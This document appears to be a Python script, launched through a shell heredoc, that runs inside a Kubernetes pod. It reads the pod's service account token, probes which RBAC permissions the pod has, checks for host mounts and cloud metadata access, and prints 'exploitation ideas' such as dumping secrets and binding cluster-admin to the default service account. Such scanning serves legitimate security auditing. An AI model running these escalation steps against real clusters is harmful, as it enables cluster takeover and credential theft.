python3 - <<'EOF'
#!/usr/bin/env python3
import subprocess
import json
import sys
from pathlib import Path

# Colors
class C:
    G = "\033[92m"  # Green
    R = "\033[91m"  # Red  
    Y = "\033[93m"  # Yellow
    B = "\033[94m"  # Blue
    M = "\033[95m"  # Magenta
    C = "\033[96m"  # Cyan
    W = "\033[1m"   # Bold
    X = "\033[0m"   # Reset

print(f"{C.C}🔍 K8s Permission Scanner{C.X}")

# Check if in pod
SA_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")
if not SA_DIR.exists():
    print(f"{C.R}❌ Not in a Kubernetes pod{C.X}")
    exit(1)

# Get credentials
TOKEN = (SA_DIR / "token").read_text().strip()
NAMESPACE = (SA_DIR / "namespace").read_text().strip()
CACERT = str(SA_DIR / "ca.crt")
API = "https://kubernetes.default.svc"

print(f"{C.B}📍 Namespace: {NAMESPACE}{C.X}")

def check_perm(resource, verb, ns=None, group=""):
    """Check single permission"""
    payload = {
        "kind": "SelfSubjectAccessReview",
        "apiVersion": "authorization.k8s.io/v1",
        "spec": {
            "resourceAttributes": {
                "verb": verb,
                "resource": resource
            }
        }
    }
    
    if group:
        payload["spec"]["resourceAttributes"]["group"] = group
    if ns:
        payload["spec"]["resourceAttributes"]["namespace"] = ns
    
    cmd = [
        "curl", "-s", "--cacert", CACERT,
        "-H", f"Authorization: Bearer {TOKEN}",
        "-H", "Content-Type: application/json",
        "-X", "POST",
        f"{API}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        "-d", json.dumps(payload)
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            resp = json.loads(result.stdout)
            return resp.get("status", {}).get("allowed", False)
    except:
        pass
    return False

def scan_resources():
    """Scan common resources"""
    print(f"\n{C.W}=== PERMISSION SCAN ==={C.X}")
    
    resources = [
        ("pods", ""),
        ("secrets", ""),  
        ("configmaps", ""),
        ("services", ""),
        ("serviceaccounts", ""),
        ("deployments", "apps"),
        ("roles", "rbac.authorization.k8s.io"),
        ("rolebindings", "rbac.authorization.k8s.io"),
    ]
    
    verbs = ["get", "list", "create", "update", "patch", "delete"]
    dangerous = []
    
    for resource, group in resources:
        perms = []
        for verb in verbs:
            if check_perm(resource, verb, NAMESPACE, group):
                perms.append(verb)
        
        if perms:
            # Check if dangerous
            danger_verbs = [v for v in perms if v in ["create", "update", "patch", "delete"]]
            is_dangerous = len(danger_verbs) > 0 or resource in ["secrets", "pods", "roles", "rolebindings"]
            
            color = C.Y if is_dangerous else C.G
            flags = " 🔥" if danger_verbs else ""
            if resource in ["secrets", "roles", "rolebindings"]:
                flags += " ⚠️"
            
            print(f"{resource:<20} -> {color}{','.join(perms)}{C.X}{flags}")
            
            if is_dangerous:
                dangerous.append((resource, perms))
        else:
            print(f"{resource:<20} -> {C.R}NONE{C.X}")
    
    return dangerous

def scan_cluster():
    """Scan cluster resources"""
    print(f"\n{C.W}=== CLUSTER RESOURCES ==={C.X}")
    
    cluster_resources = [
        ("nodes", ""),
        ("namespaces", ""),
        ("clusterroles", "rbac.authorization.k8s.io"),
        ("clusterrolebindings", "rbac.authorization.k8s.io"),
    ]
    
    dangerous = []
    verbs = ["get", "list", "create", "update", "patch", "delete"]
    
    for resource, group in cluster_resources:
        perms = []
        for verb in verbs:
            if check_perm(resource, verb, None, group):
                perms.append(verb)
        
        if perms:
            danger_verbs = [v for v in perms if v in ["create", "update", "patch", "delete"]]
            is_dangerous = len(danger_verbs) > 0
            
            color = C.R if is_dangerous else C.G
            flags = " 💥" if danger_verbs else ""
            
            print(f"{resource:<20} -> {color}{','.join(perms)}{C.X}{flags}")
            
            if is_dangerous:
                dangerous.append((resource, perms))
        else:
            print(f"{resource:<20} -> {C.R}NONE{C.X}")
    
    return dangerous

def check_special():
    """Check special permissions"""
    print(f"\n{C.W}=== SPECIAL CHECKS ==={C.X}")
    
    # Pod exec
    if check_perm("pods", "create", NAMESPACE):
        print(f"Pod exec capability    -> {C.Y}POSSIBLE{C.X} (can create pods)")
    else:
        print(f"Pod exec capability    -> {C.G}BLOCKED{C.X}")
    
    # Secret access
    if check_perm("secrets", "get", NAMESPACE):
        print(f"Secret reading         -> {C.R}ALLOWED{C.X} 🔐")
    else:
        print(f"Secret reading         -> {C.G}BLOCKED{C.X}")
    
    # Service account tokens
    if check_perm("serviceaccounts", "get", NAMESPACE):
        print(f"ServiceAccount access  -> {C.Y}ALLOWED{C.X} 🎫")
    else:
        print(f"ServiceAccount access  -> {C.G}BLOCKED{C.X}")

def generate_exploits(dangerous_perms, dangerous_cluster):
    """Generate simple exploits"""
    if not dangerous_perms and not dangerous_cluster:
        print(f"\n{C.G}✅ No dangerous permissions found{C.X}")
        return
    
    print(f"\n{C.W}=== EXPLOITATION IDEAS ==={C.X}")
    
    for resource, perms in dangerous_perms:
        if resource == "pods" and "create" in perms:
            print(f"{C.Y}🚨 Pod Creation:{C.X}")
            print(f"   kubectl run evil --image=alpine -it --rm -- sh")
            print(f"   # Try: --privileged --host-network --host-pid")
        
        if resource == "secrets" and "get" in perms:
            print(f"{C.R}🔐 Secret Access:{C.X}")
            print(f"   kubectl get secrets -o yaml")
        
        if resource == "roles" and "create" in perms:
            print(f"{C.R}🔥 RBAC Escalation:{C.X}")
            print(f"   kubectl create role admin --verb='*' --resource='*'")
        
        if resource == "rolebindings" and "create" in perms:
            print(f"{C.R}💥 Privilege Escalation:{C.X}")
            print(f"   kubectl create rolebinding pwn --role=admin --serviceaccount={NAMESPACE}:default")
    
    for resource, perms in dangerous_cluster:
        if resource == "clusterrolebindings" and "create" in perms:
            print(f"{C.R}💀 CLUSTER ADMIN POSSIBLE:{C.X}")
            print(f"   kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount={NAMESPACE}:default")

def check_environment():
    """Quick environment checks"""
    print(f"\n{C.W}=== ENVIRONMENT ==={C.X}")
    
    # Check for host mounts
    try:
        with open('/proc/mounts', 'r') as f:
            mounts = f.read()
        
        if '/host' in mounts:
            print(f"Host filesystem       -> {C.R}MOUNTED{C.X} 🚨")
        
        if 'docker.sock' in mounts:
            print(f"Docker socket         -> {C.R}MOUNTED{C.X} 🐳")
        
        if '/var/lib/kubelet' in mounts:
            print(f"Kubelet directory     -> {C.Y}MOUNTED{C.X}")
    
    except:
        pass
    
    # Check for metadata services
    try:
        result = subprocess.run(['curl', '-s', '--connect-timeout', '2', 'http://169.254.169.254'], 
                              capture_output=True, timeout=3)
        if result.returncode == 0:
            print(f"Cloud metadata        -> {C.Y}ACCESSIBLE{C.X} ☁️")
    except:
        pass

# Main execution
try:
    check_environment()
    dangerous_ns = scan_resources()
    dangerous_cluster = scan_cluster()
    check_special()
    generate_exploits(dangerous_ns, dangerous_cluster)
    
    print(f"\n{C.G}✅ Scan complete!{C.X}")
    
except KeyboardInterrupt:
    print(f"\n{C.Y}⚠️ Interrupted{C.X}")
except Exception as e:
    print(f"{C.R}❌ Error: {e}{C.X}")
EOF
